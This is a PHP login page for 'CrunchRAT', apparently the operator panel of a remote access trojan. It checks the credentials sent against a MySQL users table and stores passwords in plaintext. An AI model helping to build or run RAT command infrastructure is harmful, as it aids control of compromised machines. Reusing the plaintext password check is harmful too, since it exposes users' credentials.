<?php  
  # Necessary at the top of every page for session management
  session_start();
  
  # Includes the RAT configuration file
  include "config/config.php";

  # Establishes a connection to the RAT database
  # Uses variables from "config/config.php"
  # "SET NAMES utf8" is necessary to be Unicode-friendly
  $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
    </nav> <!-- End of navigation bar -->

    <div class="container">
      <form class="form-inline" method="post">
        <div class="form-group">
          <input type="text" class="form-control" name="username" placeholder="Username">
        </div>
        <div class="form-group">
          <input type="password" class="form-control" name="password" placeholder="Password">
        </div>
        <button type="submit" name="submit" class="btn btn-default">Login</button>
      </form>

    <?php
      # If the user clicked "Login"
      if (isset($_POST["submit"]))
      {
        $username = $_POST["username"]; # Username
        $password = $_POST["password"]; # Password
        
        # If all of the necessary fields are set
        if (isset($username) && !empty($username) && isset($password) && !empty($password))
        {
          # Determines if the username/password entered match a valid set of credentials
          $statement = $dbConnection->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
          $statement->bindValue(":username", $username);
          $statement->bindValue(":password", $password);
          $statement->execute();

          $rowCount = $statement->rowCount();

          # Kills database connection
          $statement->connection = null;

          # rowCount will be 1 if successful authentication
          if ($rowCount == 1)
          {
            # Successful authentication occurred
            # We now start a session
            $_SESSION["authenticated"] = 1;

            # Sets $_SESSION["username"] to the current logged in user
            # http://stackoverflow.com/questions/8703507/how-can-i-get-a-session-id-or-username-in-php
            $_SESSION["username"] = $username;

            # Redirects to index.php due to successful authentication
            header("Location: index.php");
          }
          # Else failed authentication
          else
          {
            # Displays error message - "Invalid username or password"
            echo "<br><div class='alert alert-danger'>Invalid username or password.</div>";          
          }
        }
        # Not all fields were set
        else
        {
          # Displays error message - "Please fill out all fields."
          echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
        }
      }
    ?>
    </div> <!-- End of container -->
  </body> <!-- End of body -->
</html>
